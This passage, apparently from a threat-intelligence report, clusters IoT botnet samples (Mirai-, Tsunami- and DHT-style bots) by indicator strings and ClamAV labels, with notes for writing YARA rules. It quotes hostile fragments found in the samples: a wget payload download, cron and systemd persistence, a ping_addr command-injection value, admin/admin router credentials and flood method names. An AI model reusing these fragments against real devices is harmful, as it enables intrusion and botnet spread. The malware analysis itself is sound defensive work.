Go runtime plus TLS code; the eight builds have near-identical function counts (4379-4586) and non-library BSim score 0.82 to 1.0 across arches. No C2 or branding strings recovered. Purpose unknown.

Strings: `'8/dev/null' (4/8 in group, 4 in set)`; `'SigEd25519 no Ed25519 collisions' (8/8 in group, 9 in set)`; `'TLS 1.3, server CertificateVerify' (4/8 in group, 6 in set)`

### dht_bep44_bot - armv4l..armv7l .bin builds with bencoded DHT messages

Family: other / DHT/BEP44 peer bot (Mozi/Hajime-like). Files: 4 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

Strings for BitTorrent DHT: e1:q9:get_peers1:t2:, 3:seqi%llde3:sig64: (BEP44 mutable item, signed), 5:token%d:. Names armv4l.bin to armv7l.bin. The signed-DHT design is Hajime-like, but I did not verify against Hajime samples, so the family is a guess.

Strings: `'ybndrfg8ejkmcpqxot1uwisza345h769' (4/4 in group, 4 in set)`; `'e1:q9:get_peers1:t2:' (4/4 in group, 4 in set)`; `'3:seqi%llde3:sig64:' (4/4 in group, 4 in set)`; `'3:seqi%llde1:v%d:' (4/4 in group, 4 in set)`; `'e1:q4:ping1:t2:' (4/4 in group, 4 in set)`; `'e1:q3:put1:t2:' (4/4 in group, 4 in set)`; `'e1:q3:get1:t2:' (4/4 in group, 4 in set)`; `'/proc/self/fd' (4/4 in group, 4 in set)`

### udp_vse_tiny - 15-function MIPS stub with named flood methods

Family: other / tiny attack-module (UDP-VSE, MINECRAFT, TCP-FIVEM). Files: 4 (2 UPX originals with an unpacked sibling in the set). Confidence: low.

Two unpacked 15-function MIPS builds (and their UPX originals named boatnet.mips / boatnet.mpsl). Only strings are method names TCP-HANDSHAKE, UDP-VSE, MINECRAFT, TCP-FIVEM, UDP-RAW. Probably a stripped flood module rather than a full bot. The boatnet.* file names are misleading.

Strings: `'212.43.149.186' (2/2 in group, 2 in set)`; `'TCP-HANDSHAKE' (2/2 in group, 2 in set)`; `'%s %s %d %d' (2/2 in group, 2 in set)`; `'UDP-CUSTOM' (2/2 in group, 2 in set)`; `'TCP-FIVEM' (2/2 in group, 2 in set)`; `'MINECRAFT' (2/2 in group, 2 in set)`; `'TCP-ACK' (2/2 in group, 2 in set)`; `'UDP-RAW' (2/2 in group, 2 in set)`

### mtab_manji - manji.mpsl, nerv.mpsl and two others sharing nodiratime/noexec mount-option strings

Family: other / manji / nerv (mount-flag strings). Files: 4 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

MIPS-LE builds that embed mount-option strings (nodiratime, nosuid, noatime, noexec, /etc/mtab) and an HTTP User-Agent helper. ClamAV OK except one Mirai-10018488. Weak evidence: four files, one clear marker.

Strings: `'nodiratime' (3/4 in group, 4 in set)`; `'/etc/mtab' (3/4 in group, 4 in set)`; `'noatime' (3/4 in group, 4 in set)`; `'nosuid' (3/4 in group, 4 in set)`; `'noexec' (3/4 in group, 6 in set)`

### static_bot_started - Static-glibc dropper with ssh/systemd persistence

Family: other / static glibc bot ("BOT STARTED", /tmp/.bot). Files: 3 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

Static glibc images (850-990 functions) with "BOT STARTED\n", wget -O /tmp/.bot, "* * * * * root" cron persistence, a systemd unit "Description=Network Manager" with Restart=always, ping_addr=127.0.0.1%0a injection and a Huawei-style Action=Update&User=admin&Pass=admin command. ClamAV Mirai-1... family label only. The MIPS-LE member has no clear marker beyond static linking and the shared 0.54 similarity.

Strings: `"linkval[0] == '/'" (3/3 in group, 3 in set)`; `'_dl_get_origin' (3/3 in group, 3 in set)`; `'diffie-hellman-group14-sha1,diffie-hellman-group1-sha1' (2/3 in group, 2 in set)`; `'Content-Type: text/xml\r\nContent-Length: ' (2/3 in group, 2 in set)`; `'/proc/sys/net/ipv4/tcp_max_orphans' (2/3 in group, 2 in set)`; `'rsa-sha2-512,rsa-sha2-256,ssh-rsa' (2/3 in group, 2 in set)`; `'\nRestart=always\nRestartSec=30\n' (2/3 in group, 2 in set)`; `'Description=Network Manager\n' (2/3 in group, 2 in set)`

### bottx - MIPS bot with bot-auth-v1/bot-tx-v1/bot-rx-v1 channel

Family: other / HTTP token bot (bot-tx-v1). Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

Two MIPS builds (BE, LE) with 1100+ functions: strings bot-auth-v1, bot-tx-v1, bot-rx-v1, method=getConfiguration, method=getEndpoints&token=, token=%s&sid=%s&nonce=%u&seq=%u, an Android hint (/system/bin/toybox) and process-name allow/blocklist checks (reason=tmp, var_run, blocklist). Not Mirai-derived by strings; pure guess at family.

Strings: `'Content-Type: application/x-www-form-urlencoded\r\n' (2/2 in group, 2 in set)`; `'token=%s&sid=%s&nonce=%u&seq=%u' (2/2 in group, 2 in set)`; `'method=getEndpoints&token=' (2/2 in group, 2 in set)`; `'Connection: keep-alive\r\n' (2/2 in group, 2 in set)`; `'method=getConfiguration' (2/2 in group, 2 in set)`; `'token=%s&sid=%s&x=%u' (2/2 in group, 2 in set)`; `'Content-Length: %d\r\n' (2/2 in group, 2 in set)`; `'Transfer-Encoding:' (2/2 in group, 2 in set)`

### stun_probe - MIPS bot that queries stun.cloudflare.com

Family: other / STUN probe (stun.cloudflare.com). Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

Two MIPS builds with stun.cloudflare.com, 74.125.250.129 and /proc/net/unix. Purpose unclear (public-IP discovery). ClamAV OK.

Strings: `'stun.cloudflare.com' (2/2 in group, 2 in set)`; `'/proc/net/unix' (2/2 in group, 2 in set)`

### go_bot_b - Go binary with crypto/tls, 2800-3500 functions

Family: other / Go-compiled program (TLS 1.3, x86 + ARM). Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

Two Go builds (x86, ARM) with TLS 1.3 and Ed25519 strings. No malicious indicators in the strings I looked at.

### static_sk_bot - Two static-glibc builds (aarch64, ARM) using /tmp/.sk /tmp/.se /tmp/.z

Family: other / static glibc bot (/tmp/.sk /tmp/.se /tmp/.z). Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

About 960-990 functions. Only marker: temp paths /tmp/.sk, /tmp/.se, /tmp/.z; mutual non-library similarity 0.33. Related to zbot_static only at the glibc level (0.05).

Strings: `'/tmp/.sk' (2/2 in group, 2 in set)`; `'/tmp/.se' (2/2 in group, 2 in set)`

### tsun_net_series - ballnet/cracknet/dicknet/unet/fucknet/weednet/gaynet/botnet/swatnet/cock

Family: tsunami / *net series (KTN/R6-LAG, OVH-STORM, RyMGang). Files: 12 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

A single code base seen under many "-net" names and three string flavours: HTTPS-KTN, UDPRAW, HTTP-KO, NFO-KTN, CF-KILL, R6-LAG (ballnet, cracknet, dicknet, net, unet); OVH-STORM, HIPER-OVH, DOMINATE, Lb32N7BOTNETYt4WLWrWnrm0iqhi and the sshpass spreader (cock, fucknet, weednet, swatnet); RyMGang / Vixaati / discord.gg/bddHzGg banners (botnet, gaynet, swatnet). ClamAV labels all as Trojan.Tsunami-6981155. The flavours overlap so they are kept as one group; a split by string flavour is possible.

Strings: `'%*d: %*s %*s %*x %*s %*s %*s %*s %*s %*s %lu' (11/12 in group, 11 in set)`; `'DOMINATE Flooding %s for %d seconds.' (10/12 in group, 10 in set)`; `'Failed setting raw headers mode.' (11/12 in group, 11 in set)`; `'Failed opening raw socket.' (11/12 in group, 11 in set)`; `'%*d: %255s %255s %x' (11/12 in group, 11 in set)`; `'ssh_server_ip' (11/12 in group, 11 in set)`; `'Hax0r@1337' (11/12 in group, 11 in set)`; `'HYDRA-KILL' (10/12 in group, 10 in set)`

### tsun_holocaust - Tsunami/kaiten-style IRC-less bot with Holocaust attack names

Family: tsunami / Holocaust (OVHCRUSH, CPU-RAPE). Files: 9 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

ANSI banner \e[36mIHolocaust, attack names OVHCRUSH, OVHFREEZE, OVH-NULL, CPU-RAPE, HOME-SEC, /cdn-cgi/l/chk_captcha (Cloudflare check bypass), the Source-engine query string and the netis "Self Rep" banner. A second key table of "/x48/x39/x32..." style escaped bytes. ClamAV Trojan.Tsunami-6981155. The mips, mpsl and sh4 members are stripped (no strings), tied by ClamAV tag and 0.92 mutual similarity only.

Strings: `'xmiwdio MOQWI"K (**(D8u9289d2892e9 NIOWJDiojwioWAJM DKLAM) ' (7/9 in group, 7 in set)`; `'9u123448u124au814d4x10' (4/9 in group, 4 in set)`; `'TSource Engine Query' (4/9 in group, 6 in set)`

## Unclassified

- `029aac2ae11ceeef7d62d33d6da7d893` ff09cf7dfd1dc1466815d4df098065 (, 234 functions)
- `20f37ddd64cc4420e7cbe0c86de11c54` 20f37ddd64cc4420e7cbe0c86de11c (MIPS:LE:32:default, 178 functions)
- `244f09619822076ebe8a32c3f33f2ed5` pkf4m2 (MIPS:LE:32:default, 94 functions)
- `2ad848d5241871c8a8987d848c2153fe` tuxnokill.mpsl (MIPS:LE:32:default, 185 functions)
- `2e6c324031824e1a88125dc50d15ada7` nova.mipsel (MIPS:LE:32:default, 619 functions)
- `3a56ddd92e6e45ed7c0fe47301f0a70e` cded6f69826e1359c191dc2884b339 (MIPS:BE:64:default, 184 functions)
- `40cfee292a4375cab18a22fa4edffda0` 40cfee292a4375cab18a22fa4edffd (MIPS:LE:32:default, 488 functions)
- `5d7d2618e09ea3c84f5a484553e0ea65` ff09cf7dfd1dc1466815d4df098065 (x86:LE:32:default, 234 functions)
- `7315d6b3184da18833691c46c63e8ede` mipsle (MIPS:LE:64:64-32R6addr, 1124 functions)
- `75181839d4eca01c095f5976cfe06f71` 8e9f87bb25ff83e4ad970366bba47a (ARM:LE:32:v8, 281 functions)
- `76b7160542233733eefbee1dbaa88e53` efeb7f29d142cf3387f20cb184b399 (x86:LE:32:default, 442 functions)
- `7f8d1f42a0a6a65de39dde54781aa829` efeb7f29d142cf3387f20cb184b399 (, 442 functions)
- `83866cc199ebdb057b19649efbc703bb` 83866cc199ebdb057b19649efbc703 (MIPS:BE:32:default, 8 functions)
- `847e331148ecc4cac06c1fe163f50b94` 847e331148ecc4cac06c1fe163f50b (MIPS:LE:32:default, 12 functions)
- `8898500b3ec392e67f1f453550395a09` aarch64.bin (?, 0 functions)
- `8cf35e8a597f814508927e1382a8d503` 8cf35e8a597f814508927e1382a8d5 (MIPS:LE:32:default, 193 functions)
- `931d528a687b39f6a8e2ca8ea79077d7` 32a9892b9968c6acf561d371891ec5 (ARM:LE:32:v8, 11 functions)
- `c3755eda65b54cc55f4ca42d94d3283e` c3755eda65b54cc55f4ca42d94d328 (MIPS:BE:32:default, 206 functions)
- `c6843706007fded1326f496dc6c30eb9` mipsle (MIPS:LE:64:64-32R6addr, 2 functions)
- `cd4df2be265b8ef1c4e4c191432d6341` chernobyl.mips (MIPS:BE:32:default, 1361 functions)
- `eceb189b5f6cc65cd2a8cedc94a5c37b` ac9a2105efe6f38edaaa6e5af71134 (x86:LE:32:default, 176 functions)
- `eda867252a9b325351c1992c1bcca422` 768d4e8acc72b22dfef65b1fdedf23 (x86:LE:64:default, 4 functions)
- `ee518fb241614b9845c69cf85f04b2bf` ee518fb241614b9845c69cf85f04b2 (MIPS:LE:32:default, 4 functions)
- `f876b7684528040bbba71b12eecb56d5` 8e9f87bb25ff83e4ad970366bba47a (, 281 functions)

## Notes

Method: per-file string tables (strings API, 447 calls) turned into marker flags and an IDF-cosine hierarchical clustering; ClamAV signature numbers used to place UPX originals and stripped builds; the precomputed binary similarity (score_code, non-library part) used to place files without usable strings; each .unpacked file and its UPX original, and each .zip and its .elf child, are always in the same group. File names are weak evidence (boatnet.*, bot.*, nuclear.* mean little). Libc-heavy static builds are the main source of noise: BSim and string clustering both lump glibc/uClibc builds together, so arch/libc build explains many false neighbours. Groups at confidence "low" or with 2-4 files should be re-checked before writing family-specific YARA. UPX originals (82) carry no strings or functions of their own; YARA authors should write rules on the unpacked sibling listed in upx_pairs. The collection holds ~160 UPX-tagged files, 81 of which are .unpacked copies.
